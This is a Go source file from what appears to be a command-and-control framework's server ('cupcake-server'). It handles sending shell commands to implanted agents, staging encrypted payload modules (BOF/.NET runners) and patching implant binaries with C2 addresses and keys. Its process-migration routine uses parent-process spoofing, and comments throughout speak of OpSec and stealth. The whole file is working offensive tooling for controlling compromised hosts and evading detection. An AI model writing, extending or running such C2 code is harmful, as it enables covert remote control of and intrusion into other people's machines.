package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// SendCommand sends a shell command to the agent
func SendCommand(uuid string, command string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// OpSec: 精确过滤 UI 发送的 ping 心跳包（仅匹配 JSON 格式的 {"type":"ping"}）
	if command == `{"type":"ping"}` || command == "ping" {
		return nil
	}

	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "shell",
			CommandContent: command,
			ReqID:          reqID,
		},
	}

	// [LOGGING] Record command to DB
	_ = store.CreateCommandLog(uuid, reqID, "shell", command)

	return WriteEncryptedMessage(client, msg)
}

// SendModuleStage packs and pushes an L2 module (CKMS) to a Stage0 agent.
func SendModuleStage(uuid, moduleID string) error {
	_, err := SendModuleStageWait(uuid, moduleID, 0)
	return err
}

// SendModuleStageWait pushes module and optionally waits for agent ack (timeout>0).
func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, error) {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	ms := GetModuleService()
	// Agent module HMAC key = derive_module_key(get_aes_key()).
	// get_aes_key() = DeriveKey(normalize(baseAES), salt32)  — salt ALWAYS applied when present
	// (Go websocket also uses make([]byte,32)+copy salt, then DeriveKey).
	// Bug: packing with only base AES (no salt KDF) → HMAC verify failed on agent.
	rawKey := strings.TrimSpace(client.EncryptKey)
	if rawKey == "" {
		rawKey = strings.TrimSpace(store.GetSetting("system_aes_key"))
	}
	if rawKey == "" {
		// Release agent without patch: empty get_aes_key → default_module_key
		ms.SetKeySeed(nil)
	} else {
		base := normalizeAESKey(rawKey)
		salt := make([]byte, 32)
		copy(salt, []byte(strings.TrimSpace(client.EncryptionSalt)))
		// Same as WriteEncryptedMessage session key material
		sessionKey := utils.DeriveKey(base, salt)
		// SetKeySeed applies derive_module_key(sessionKey) ≡ agent module_key()
		ms.SetKeySeed(sessionKey)
	}

	// Ensure runtime bins from disk if not registered yet
	_ = ms.TryLoadDefaultRuntime(moduleID)

	b64, err := ms.PackBase64(moduleID)
	if err != nil {
		return "", err
	}
	reqID := fmt.Sprintf("MOD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_stage",
			CommandContent: moduleID,
			Path:           moduleID,
			Data:           b64,
			ReqID:          reqID,
		},
	}
	_ = store.CreateCommandLog(uuid, reqID, "module_stage", moduleID)

	var ch chan interface{}
	if timeout > 0 {
		ch = make(chan interface{}, 1)
		globals.PendingResponses.Store(reqID, ch)
		defer globals.PendingResponses.Delete(reqID)
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}
	if timeout <= 0 {
		// Fire-and-forget: still mark optimistic so UI can disable re-push after operator confirms
		GetModuleService().MarkAgentModule(uuid, moduleID)
		return reqID, nil
	}

	select {
	case resp := <-ch:
		if m, ok := resp.(map[string]interface{}); ok {
			out, _ := m["stdout"].(string)
			se, _ := m["stderr"].(string)
			if se != "" && out == "" {
				return "", fmt.Errorf("%s", se)
			}
			GetModuleService().MarkAgentModule(uuid, moduleID)
			return out, nil
		}
		GetModuleService().MarkAgentModule(uuid, moduleID)
		return fmt.Sprintf("%v", resp), nil
	case <-time.After(timeout):
		// May still have loaded; mark optimistic so UI shows staged
		GetModuleService().MarkAgentModule(uuid, moduleID)
		log.Printf("[Module] wait ack timeout for %s on %s — marked staged (optimistic)", moduleID, uuid)
		return "", fmt.Errorf("module_stage ack timeout for %s", moduleID)
	}
}

// SendModuleUnload asks agent to FreeLibrary / drop L2 module (burn-after-use).
func SendModuleUnload(uuid, moduleID string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)
	reqID := fmt.Sprintf("MODUN-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_unload",
			CommandContent: moduleID,
			ReqID:          reqID,
		},
	}
	_ = store.CreateCommandLog(uuid, reqID, "module_unload", moduleID)
	if err := WriteEncryptedMessage(client, msg); err != nil {
		return err
	}
	GetModuleService().ClearAgentModule(uuid, moduleID)
	return nil
}

// EnsureHeavyRuntimeModule stages the sacrificial iso_host PE (not same-process DLL).
// plugins (assets/plugins) = BOF/.NET payloads; modules id=iso_host = cupcake-iso-host.exe
// moduleID "bof"/"dotnet" both ensure iso_host for isolated PPID spawn path.
func EnsureHeavyRuntimeModule(uuid, moduleID string) error {
	moduleID = strings.TrimSpace(strings.ToLower(moduleID))
	if moduleID != "bof" && moduleID != "dotnet" && moduleID != "iso_host" {
		return fmt.Errorf("unsupported runtime module %q", moduleID)
	}
	// Isolated path: only need the host PE
	hostID := "iso_host"
	_, err := SendModuleStageWait(uuid, hostID, 25*time.Second)
	if err != nil && strings.Contains(err.Error(), "timeout") {
		time.Sleep(1500 * time.Millisecond)
		return nil
	}
	if err != nil {
		return err
	}
	time.Sleep(400 * time.Millisecond)
	return nil
}

// MaybeAutoPushModule inspects agent stderr for module_required:<id> and pushes once.
func MaybeAutoPushModule(uuid, stderr string) {
	if !strings.Contains(stderr, "module_required:") {
		return
	}
	// extract id after module_required:
	idx := strings.Index(stderr, "module_required:")
	if idx < 0 {
		return
	}
	rest := stderr[idx+len("module_required:"):]
	id := rest
	for i, c := range rest {
		if c == ' ' || c == '(' || c == '\n' || c == '\r' || c == ',' {
			id = rest[:i]
			break
		}
	}
	id = strings.TrimSpace(id)
	if id == "" {
		return
	}
	if err := SendModuleStage(uuid, id); err != nil {
		log.Printf("[Module] auto-push %s → %s failed: %v (upload module to storage/modules first)", id, uuid, err)
	} else {
		log.Printf("[Module] auto-pushed module %s to agent %s — re-run the command after ~1s", id, uuid)
	}
}

// SendModuleList asks Stage0 for currently loaded modules (module_list command).
func SendModuleList(uuid string) (string, error) {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("MODLIST-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "module_list",
			CommandContent: "",
			ReqID:          reqID,
		},
	}

	// Wait for matching response
	ch := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, ch)
	defer globals.PendingResponses.Delete(reqID)

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}

	select {
	case resp := <-ch:
		if m, ok := resp.(map[string]interface{}); ok {
			out, _ := m["stdout"].(string)
			errStr, _ := m["stderr"].(string)
			if errStr != "" && out == "" {
				return "", fmt.Errorf("%s", errStr)
			}
			GetModuleService().SetAgentModules(uuid, out)
			return out, nil
		}
		return fmt.Sprintf("%v", resp), nil
	case <-time.After(12 * time.Second):
		return "", fmt.Errorf("timeout waiting for module_list")
	}
}

// MigrateToMemory handles the migration logic (Proper implementation from old main.go)
func MigrateToMemory(uuid string, targetProcess string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok { return fmt.Errorf("agent offline") }
	client := val.(*globals.Client)

	var raw []byte
	var err error

	// Search for latest built artifact (filter by extension based on target OS)
	matches, _ := filepath.Glob(filepath.Join("storage/payloads", "*"))
	if len(matches) > 0 {
		var bestMatch string
		var bestTime time.Time
		for _, m := range matches {
			base := filepath.Base(m)
			// Windows targets: must end with .exe
			// Linux targets: must NOT end with .exe
			if client.OS == "windows" && !strings.HasSuffix(base, ".exe") { continue }
			if client.OS == "linux" && strings.HasSuffix(base, ".exe") { continue }
			
			if info, err := os.Stat(m); err == nil {
				if info.ModTime().After(bestTime) {
					bestTime = info.ModTime()
					bestMatch = m
				}
			}
		}
		if bestMatch != "" {
			raw, _ = os.ReadFile(bestMatch)
			// Artifact found silently
		}
	}

	// Fallback to templates if no built artifacts found
	if len(raw) == 0 {
		templatePath := "assets/client_template_windows.exe"
		if client.OS == "linux" {
			templatePath = "assets/client_template_linux"
		}
		raw, err = os.ReadFile(templatePath)
		if err != nil {
			log.Printf("[Migration] Error reading fallback template: %v", err)
			return fmt.Errorf("no suitable migration source found")
		}
	}

	// Patch Config for migration
	aesKey := store.GetSetting("system_aes_key")
	if client.EncryptKey != "" { aesKey = client.EncryptKey }
	
	// Determine C2 URL for the new process
	c2url := ""
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		host := ln.PublicHost
		if host == "" { host = ln.BindIP }
		if host == "0.0.0.0" || host == "" {
			host = store.GetSetting("system_c2_host")
			if host == "" { 
				host = "127.0.0.1" 
				// Smart fallback: try to use the Local IP the agent used to connect to us
				if client.TCPConn != nil {
					if localAddr, ok := client.TCPConn.LocalAddr().(*net.TCPAddr); ok {
						if !localAddr.IP.IsUnspecified() {
							host = localAddr.IP.String()
						}
					}
				}
			}
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS", "WEBSOCKET":
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		case "BIND-TCP", "正向TCP":
			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		}
		// Migration target resolved silently
	}

	if c2url == "" {
		globals.Listeners.Range(func(k, v interface{}) bool {
			ln := v.(*globals.Listener)
			if ln.Status == "Running" {
				host := ln.PublicHost
				if host == "" { host = ln.BindIP }
				if host == "0.0.0.0" || host == "" { host = "127.0.0.1" }

				switch strings.ToUpper(ln.Protocol) {
				case "WS", "WEBSOCKET":
					c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
					return false
				case "TCP":
					c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
					return false
				case "DNS":
					c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
					return false
				case "BIND-TCP", "正向TCP":
					c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
					return false
				}
			}
			return true
		})
	}
	if c2url == "" {
		c2url = "ws://127.0.0.1:8081/ws"
	}

	heartbeat := 10
	salt := client.EncryptionSalt
	obf := client.ObfuscateMode
	jitter := 30
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		if salt == "" { salt = ln.EncryptionSalt }
		if obf == "" { obf = ln.ObfuscateMode }
		jitter = ln.HeartbeatJitter
		heartbeat = ln.HeartbeatInterval
	}

	patched, err := PatchPayload(raw, c2url, aesKey, heartbeat, jitter, "", false, 0, salt, obf)
	if err != nil {
		return fmt.Errorf("failed to patch migration template: %v", err)
	}

	// --- MIGRATION STRATEGY ---
	// Send raw PE EXE. Client detects MZ and spawn-from-disk with PPID spoof:
	//   Layer A (all profiles): Nt parent resolve/open + PEB CreateProcessW attributes
	//   Layer B (full/stealth-adv, Win10 1809+): try NtCreateUserProcess, else fall back to A
	// OS loader initializes CRT/TLS/stack cookies (more reliable than Donut shellcode).
	finalPayload := patched
	log.Printf("\x1b[36m[Migration]\x1b[0m Payload sent to %s (%d bytes) [spawn: Layer-A CreateProcessW / optional Layer-B NtCreateUserProcess]", uuid, len(finalPayload))

	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "migrate",
			CommandContent: targetProcess,
			Data:           base64.StdEncoding.EncodeToString(finalPayload),
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil { return err }

	// [LOGGING] Record migration to DB
	_ = store.CreateCommandLog(uuid, reqID, "migrate", fmt.Sprintf("Target: %s", targetProcess))
	
	// Wait for response asynchronously or handled by GetResponse/WebSocket
	// Migration complete - agent will reconnect
	return nil
}
